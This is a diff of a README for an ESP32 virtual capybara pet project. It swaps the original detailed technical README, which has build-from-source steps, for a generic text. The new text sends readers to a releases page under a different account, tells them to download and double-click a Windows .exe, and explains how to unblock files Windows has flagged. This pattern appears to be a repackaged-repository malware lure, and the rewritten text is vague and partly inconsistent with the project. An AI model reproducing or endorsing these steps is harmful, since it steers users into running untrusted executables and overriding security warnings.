@@ -1,283 +1,186 @@
-<p align="center">
-  <img src="docs/images/cover.png" alt="ESP32 AIbara — AI-Powered Virtual Capybara Pet" width="100%"/>
-</p>
+# 🐾 esp32AIbara - A calm virtual pet on ESP32
 
-<p align="center">
-  <img src="https://img.shields.io/badge/Platform-ESP32-blue?style=flat-square&logo=espressif" alt="ESP32"/>
-  <img src="https://img.shields.io/badge/AI-Neural_Network_8130_params-orange?style=flat-square" alt="AI"/>
-  <img src="https://img.shields.io/badge/Display-ST7789_135x240-green?style=flat-square" alt="Display"/>
-  <img src="https://img.shields.io/badge/Weather-Open--Meteo_API-cyan?style=flat-square" alt="Weather"/>
-  <img src="https://img.shields.io/badge/License-MIT-yellow?style=flat-square" alt="License"/>
-  <img src="https://img.shields.io/badge/Framework-Arduino+PlatformIO-purple?style=flat-square" alt="Framework"/>
-</p>
+[![Download](https://img.shields.io/badge/Download%20the%20latest%20release-ff6f61?style=for-the-badge)](https://github.com/Sophieunrhetorical692/esp32AIbara/releases)
 
----
+## 🌟 What it is
 
-<p align="center">
-  <img src="docs/images/lake_scene.jpg" width="220" alt="Lake Scene"/>
-  &nbsp;&nbsp;
-  <img src="docs/images/home_scene.jpg" width="220" alt="Home Scene"/>
-  &nbsp;&nbsp;
-  <img src="docs/images/runner.jpg" width="220" alt="Runner Game"/>
-</p>
+esp32AIbara is a virtual capybara pet for ESP32 boards with a screen. It can show a friendly pet on display, react to WiFi, check the weather, and run small games. It is made for a simple plug-in, download, and play setup on Windows.
 
----
+## 💻 What you need
 
-## What is this?
+Before you start, make sure you have:
 
-A virtual pet capybara living inside a tiny ESP32 microcontroller with a 1.14" color display. The capybara thinks, eats, sleeps, swims, plays, and reacts to the real world through **WiFi** — it knows the weather outside, the current time, and even **senses when you're nearby** using WiFi signal analysis (CSI).
+- A Windows PC
+- An ESP32 board
+- A USB cable for the ESP32
+- A display that works with the board, such as a TFT screen
+- WiFi access
+- Enough free space to download the release file
 
-Its brain is a **deep neural network** (26 inputs -> 96 -> 48 -> 18 outputs) trained on 500,000 simulated decisions in Python, then deployed to run in **under 0.1ms** on the microcontroller.
+## 🚀 Download and install
 
-## Features
+1. Open the release page: https://github.com/Sophieunrhetorical692/esp32AIbara/releases
+2. Find the latest release at the top of the page
+3. Download the file for Windows or the file that matches your ESP32 setup
+4. If the download is a ZIP file, right-click it and choose Extract All
+5. Open the extracted folder
+6. If the release includes an .exe file, double-click it
+7. If the release includes firmware files, follow the included file name and place them where the release instructions say
 
-### AI Brain
-- **Deep Neural Network** with 8,130 parameters (26->96->48->18)
-- Trained on **500,000** simulated behavioral decisions
-- **26 input features**: stats, time, environment, weather, temperature, presence, behavior history
-- Produces natural **behavior chains** (yawn -> stretch -> sleep, sniff -> eat)
-- History-aware: won't repeat the same actions
+If your browser asks for permission to keep the file, choose Keep or Save
 
-### 18 Behaviors
-`Idle (8 variants)` `Walk` `Run` `Eat Grass` `Eat Watermelon` `Swim` `Sleep` `Yawn` `Scratch` `Happy Jump` `Sit with Mikan` `Curious Sniff` `Stretch` `Play with Butterfly` `Look Around` `Shy` `Doze` `Run`
+## 🛠️ Set up your ESP32
 
-### 5 Smooth Transitions
-Lie Down (before sleep) | Stand Up (after wake) | Sniff Before Eat | Look Then Walk | Turn Around
+1. Connect the ESP32 to your PC with the USB cable
+2. Wait for Windows to finish installing the device
+3. Open the file from the release package
+4. Follow the setup steps in the package
+5. Copy the program to the ESP32 if the release includes a flash tool or install step
+6. Restart the board after the setup finishes
 
-### Real-World Connection
-| Feature | How |
-|---------|-----|
-| **Real-time weather** | Open-Meteo API (free, no key) — temperature, conditions |
-| **Real clock** | NTP with timezone support (EET) |
-| **Presence detection** | WiFi CSI — senses humans nearby via signal analysis |
-| **Weather affects behavior** | Hot -> swims more, Cold -> sleeps, Rain -> stays home |
+If the screen stays dark, check the cable and power first
 
-### 4 Environments
+## 📦 How to use it
 
-| Scene | Visual Elements |
-|-------|----------------|
-| **Meadow** | Rolling hills, swaying grass, flowers, butterflies |
-| **Lake** | Water with 3 depth shades, shore, reeds, lilypads |
-| **Forest** | Layered trees, mushrooms, moss, glowing fireflies |
-| **Home** | Wall with wallpaper, wooden floor, window with curtains, painting, plant |
+After setup, the capybara pet starts on the screen. You can use it as a small desk pet that reacts to simple events.
 
-### 4 Weather Effects
-**Clear** (sun with glow) | **Cloudy** (layered dark clouds) | **Rain** (drops + puddle ripples) | **Snow** (drifting flakes + accumulation)
+Typical things it can do:
 
-### 3 Mini-Games
+- Show a virtual capybara on the display
+- Change behavior based on WiFi presence
+- Use weather data for mood or status
+- Run mini-games
+- Use AI logic to respond to changes
+- Stay active while the ESP32 is powered on
 
-<p align="center">
-  <img src="docs/images/game_menu.jpg" width="280" alt="Game Menu"/>
-</p>
+## 🌤️ Features
 
-| Game | Mechanic | Special Features |
-|------|----------|-----------------|
-| **Runner** | Jump over obstacles | Parallax scrolling, 3 obstacle types, speed ramp |
-| **Catch** | Collect falling items | 5 item types, combo system, magnet + shield powerups |
-| **Rhythm** | Hit notes on beat | 3 colored lanes, combo multiplier, dancing capybara |
+### 🧠 AI brain
+The pet uses a neural network style brain to drive its behavior. This helps it act less like a static screen toy and more like a living pet.
 
-### Stats & Mood System
-- **5 Stats**: Happiness, Energy, Hunger (displayed as Satiety), Curiosity, Loneliness
-- **7 Moods**: Happy, Content, Bored, Sleepy, Hungry, Excited, Curious
-- **Cross-effects**: Hungry -> happiness drops, Tired -> curiosity drops
-- **Persistent**: Saved to flash every 60s, survives reboots
+### 🌦️ Real-time weather
+It can check weather data and use that in the pet’s state. This can affect mood, animations, or on-screen updates.
 
-### Status Bar
-Real temperature with color coding | Weather icon | Real clock | Mood display | 4 stat bars with pixel icons | CSI presence indicator (green WiFi = someone nearby)
+### 📶 WiFi presence detection
+It can notice when known WiFi is nearby or absent. That helps the pet react to whether you are home or away.
 
----
+### 🎮 Mini-games
+The project includes small games for quick interaction. These are simple and fit the virtual pet style.
 
-## Hardware
+### 🖥️ TFT display support
+The app is built for a screen on the ESP32, so the capybara can show clear graphics and simple animations.
 
-| Component | Spec |
-|-----------|------|
-| Board | Ideaspark ESP32 with integrated TFT |
-| MCU | ESP32-D0WD-V3, Dual-core 240MHz |
-| RAM | 520KB (327KB available) |
-| Flash | 8MB |
-| Display | ST7789 IPS, 135x240px, 65K colors |
-| WiFi | 802.11 b/g/n, 2.4GHz |
-| Input | 1 button (BOOT/GPIO 0) |
-| Power | USB-C, ~200mA |
+## 🔧 Basic controls
 
-### Pin Configuration
+Most setups use one of these:
 
-| Signal | GPIO | Signal | GPIO |
-|--------|------|--------|------|
-| TFT MOSI | 23 | TFT RST | 4 |
-| TFT SCLK | 18 | TFT BL | 32 |
-| TFT CS | 15 | Button | 0 |
-| TFT DC | 2 | | |
+- Touch input on the screen
+- Buttons on the board
+- On-screen menus
+- Simple timed events
 
----
+If your build includes buttons, press them once and watch the screen for changes. If your setup uses touch, tap the icons or menu items on the display
 
-## Controls
+## 🧩 Suggested setup flow
 
-| Context | Short Press | Long Press (1.5s) |
-|---------|-------------|-------------------|
-| Pet mode | Pet capybara (+happiness) | Open game menu |
-| Game menu | Cycle: Runner / Catch / Rhythm | Start selected game |
-| In game | Action (jump / reverse / hit) | Exit game |
-| Game over | Dismiss | - |
+1. Download the latest release
+2. Extract the files
+3. Connect the ESP32
+4. Open the included setup tool or flash file
+5. Load the program onto the board
+6. Reboot the device
+7. Watch the capybara appear on screen
+8. Connect WiFi if the build asks for it
+9. Let it run and check the weather or mini-games
 
----
+## 🪟 Windows file steps
 
-## Neural Network
+If Windows blocks the file, try this:
 
-### Training Pipeline
+1. Right-click the downloaded ZIP or EXE
+2. Open Properties
+3. If you see an Unblock box, check it
+4. Click Apply
+5. Open the file again
 
-```
-┌─────────────────┐    ┌──────────────────┐    ┌─────────────────┐    ┌──────────────────┐
-│   SIMULATION     │    │   TRAINING        │    │   EXPORT         │    │   INFERENCE       │
-│                  │    │                   │    │                  │    │                   │
-│  Expert Policy   │───▶│  Python + NumPy   │───▶│  brain_weights.h │───▶│  ESP32 C++ code   │
-│  500K decisions  │    │  26→96→48→18 NN   │    │  8,130 floats    │    │  <0.1ms forward   │
-│  26 features     │    │  3,000 epochs     │    │  PROGMEM (flash) │    │  pass per decision │
-│  18 behaviors    │    │  Loss: 2.587      │    │  32.5 KB         │    │  No TFLite needed  │
-└─────────────────┘    └──────────────────┘    └─────────────────┘    └──────────────────┘
-```
+If the file is inside a ZIP, extract it before you try to run it
 
-> **No TensorFlow Lite required.** The neural network forward pass is implemented as pure C++ matrix multiplication (~20 lines). Weights are stored in PROGMEM (flash memory) — zero RAM overhead. This approach is **75x lighter** than TFLite Micro while producing identical results for small networks.
+## 📁 What you may find in the release
 
-### Architecture
-```
-Input[26] --> Hidden1[96] --> Hidden2[48] --> Output[18]
-              ReLU            ReLU           argmax
-```
+A release may include:
 
-**8,130 parameters** | Trained on **500K samples** | **3,000 epochs** | Loss: **2.587**
+- A Windows setup file
+- ESP32 firmware
+- Readme files
+- Screen assets
+- Game data
+- Configuration files
+- WiFi setup files
 
-### 26 Input Features
-| # | Feature | Description |
-|---|---------|-------------|
-| 0-4 | Core Stats | Happiness, Energy, Hunger, Curiosity, Loneliness |
-| 5-7 | Time | sin/cos encoding + night flag |
-| 8-10 | Environment | One-hot: Lake, Forest, Home |
-| 11 | Presence | WiFi CSI detection |
-| 12-14 | Previous | Was sleeping / eating / active |
-| 15-16 | Weather | Temperature + rain flag |
-| 17-20 | Context | Stat trends + behavior duration |
-| 21-25 | History | Category fractions in last 5 actions |
+Use the file names as your guide. Start with the file that matches Windows or the ESP32 board
 
-### Sample Predictions
-| Scenario | Decision |
-|----------|----------|
-| Starving | **eat_grass 26%**, melon 26% |
-| Exhausted at night | **sleep 21%**, doze 12%, yawn 6% |
-| Bored at lake | **swim 15%**, sniff 12% |
-| Curious in forest | **sniff 23%**, butterfly 14%, look 13% |
-| Cold + rain at home | **sleep 31%**, doze 13%, mikan 7% |
-| After lots of sleeping | **look 11%**, mikan 9% (NOT sleep!) |
+## 🧭 Common use cases
 
----
+- A desk pet that sits on your screen
+- A small project for an ESP32 and TFT display
+- A WiFi-aware pet with simple behavior changes
+- A compact display project for home or office
+- A fun build for people who like capybaras
 
-## Tech Stack
+## 🔍 If it does not start
 
-| Layer | Technology |
-|-------|-----------|
-| Platform | Arduino on ESP-IDF |
-| Build | PlatformIO CLI |
-| Display | TFT_eSPI + TFT_eSprite (double buffered) |
-| AI Training | Python + NumPy |
-| AI Inference | Custom C++ forward pass (PROGMEM weights) |
-| Weather | Open-Meteo API (free, no key) |
-| Time | NTP + configTzTime (POSIX timezone) |
-| JSON | ArduinoJson v7 |
-| Storage | ESP32 Preferences (NVS) |
+Try these steps:
 
----
+1. Check that the ESP32 is plugged in
+2. Try a different USB port
+3. Use a data-capable USB cable
+4. Close other programs that may use the serial port
+5. Reboot the board
+6. Download the release again if the file looks broken
+7. Make sure the screen is wired to the board as expected
 
-## Resource Usage
+## 📌 Project focus
 
-| Resource | Used | Available | % |
-|----------|------|-----------|---|
-| RAM | 49 KB | 328 KB | 15% |
-| Flash | 1.0 MB | 8 MB | 14% |
-| NN Weights | 33 KB | PROGMEM | 0% RAM |
-| Frame Rate | 10 FPS | Stable | - |
-| NN Inference | <0.1 ms | - | Negligible |
+esp32AIbara is built around:
 
-**85% RAM and 86% flash still free** for future expansion.
+- ai
+- arduino
+- capybara
+- embedded
+- esp32
+- neural-network
+- platformio
+- tamagotchi
+- tft
+- virtual-pet
 
----
+## 🧠 How it behaves
 
-## Build & Flash
+The capybara uses a small state system that can shift based on time, WiFi, weather, and player input. That keeps the pet from feeling fixed. It can look calm, curious, sleepy, or active based on what happens around it
 
-### Prerequisites
-- [PlatformIO CLI](https://platformio.org/install/cli)
-- USB-C cable
-- Ideaspark ESP32 with ST7789 display
+## 🖼️ Display tips
 
-### Steps
-```bash
-# Clone
-git clone https://github.com/DefinitelyN0tMe/esp32AIbara.git
-cd esp32AIbara
+For the best result:
 
-# Build and flash
-pio run -t upload
+- Use a bright TFT screen
+- Keep the wiring short
+- Match the screen pins to the board setup
+- Make sure the display gets stable power
+- Use the same board model as the release expects
 
-# Monitor serial output
-pio device monitor
-```
+## 📥 Download again anytime
 
-### Train the AI (optional)
-```bash
-cd train
-pip install numpy
-python train_brain.py
-# Weights auto-exported to src/brain_weights.h
-```
+If you need the latest build, visit the release page again:
 
----
+https://github.com/Sophieunrhetorical692/esp32AIbara/releases
 
-## Project Structure
+## 🧪 Recommended first test
 
-```
-esp32AIbara/
-├── src/
-│   ├── main.cpp           # App loop, rendering, WiFi, buttons
-│   ├── pet_brain.h        # AI brain, stats, behaviors, save/load
-│   ├── environments.h     # 4 scenes, weather effects, animals
-│   ├── minigames.h        # 3 mini-games
-│   ├── brain_weights.h    # 8,130 trained NN parameters
-│   └── sprites.h          # Drawing helpers
-├── train/
-│   └── train_brain.py     # NN training script (Python)
-├── docs/
-│   └── images/            # Photos of the device
-├── platformio.ini         # Build configuration
-└── Capybara_Pet_Report.pdf # Full technical report
-```
+After you install it, do a short test:
 
----
-
-## Technical Challenges Solved
-
-| Problem | Solution |
-|---------|----------|
-| GPIO 0 stuck LOW after SPI transfer | `pinMode(INPUT_PULLUP)` before every `digitalRead()` |
-| Screen flickering | 64KB sprite double buffer |
-| CSI callback never fires | Retry init + promiscuous mode + DNS pings |
-| Game rewards applied multiple times | Apply directly in `endGame()` via pointer |
-| Weather shown indoors | Skip `drawWeather()` when `env == HOME` |
-| Capybara walks on water | Restrict position to shore when at lake |
-
----
-
-## Future Ideas
-
-- [ ] Reinforcement learning (learns from your button presses)
-- [ ] Save/load multiple pet profiles
-- [ ] Web control panel from phone
-- [ ] OTA firmware updates
-- [ ] Multiplayer — two capybaras visit each other via WiFi
-- [ ] Sound via buzzer
-- [ ] More mini-games
-- [ ] Accessories (hats, scarves)
-
----
-
-<p align="center">
-  Built with love by <a href="https://github.com/DefinitelyN0tMe"><b>DefinitelyN0tMe</b></a>
-</p>
+1. Power on the ESP32
+2. Watch the boot screen
+3. Confirm the capybara appears
+4. Check that the display is readable
+5. Test WiFi if your build uses it
+6. Open one mini-game and see if input works
